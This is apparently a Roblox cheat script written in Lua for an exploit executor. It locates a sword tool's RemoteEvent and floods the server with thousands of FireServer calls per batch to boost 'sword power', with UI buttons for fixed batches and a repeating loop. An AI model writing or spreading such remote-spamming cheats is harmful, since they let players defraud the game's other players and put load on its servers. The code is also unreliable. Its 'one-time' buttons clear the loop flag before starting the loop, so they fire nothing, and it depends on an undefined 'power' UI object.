-----------------------------------------
-- Improved Sword Power Function
-----------------------------------------
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

-- Optimized Sword Charging Function
local function loadSword(batchSize, interval)
    local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
    local backpack = localPlayer:WaitForChild("Backpack")

    -- Move all tools from Backpack to Character
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            item.Parent = character
        end
    end

    -- Find the sword tool
    local sword = character:FindFirstChild("sword")
    if not sword then
        for _, tool in ipairs(character:GetChildren()) do
            if tool:IsA("Tool") and tool.Name:lower():find("sword") then
                sword = tool
                break
            end
        end
    end

    if not sword then
        warn("Sword tool not found in character.")
        return
    end

    -- Get RemoteEvent safely
    local handle = sword:FindFirstChild("Handle")
    if not handle then
        warn("Handle missing on sword.")
        return
    end

    local up = handle:FindFirstChild("up")
    if not up then
        warn("'up' folder missing inside Handle.")
        return
    end

    local remoteEvent = up:FindFirstChild("RemoteEvent")
    if not remoteEvent then
        warn("RemoteEvent missing inside 'up'.")
        return
    end

    -- Continuous firing loop using task.spawn for non-blocking behavior
    task.spawn(function()
        while _G.continuousSwordLoop do
            for _ = 1, batchSize do
                remoteEvent:FireServer()
            end
            task.wait(interval)
        end
    end)
end

-----------------------------------------
-- UI Buttons for Sword Power
-----------------------------------------
if power and type(power.Button) == "function" then
    -- One-time 4K charge
    power:Button("Sword Power | 4K", function()
        _G.continuousSwordLoop = false
        loadSword(4000, 1)
        task.wait(1)
        _G.continuousSwordLoop = false
    end)

    -- One-time 5K charge
    power:Button("Sword Power | 5K", function()
        _G.continuousSwordLoop = false
        loadSword(5000, 1)
        task.wait(1)
        _G.continuousSwordLoop = false
    end)

    -- Continuous 10K every 5 seconds
    power:Button("Sword Power | 10K Every 5s", function()
        _G.continuousSwordLoop = true
        loadSword(10000, 5)
    end)

    -- Stop Button
    power:Button("Stop Sword Power Loop", function()
        _G.continuousSwordLoop = false
    end)
else
    warn("Power UI not found or :Button() not supported.")
end

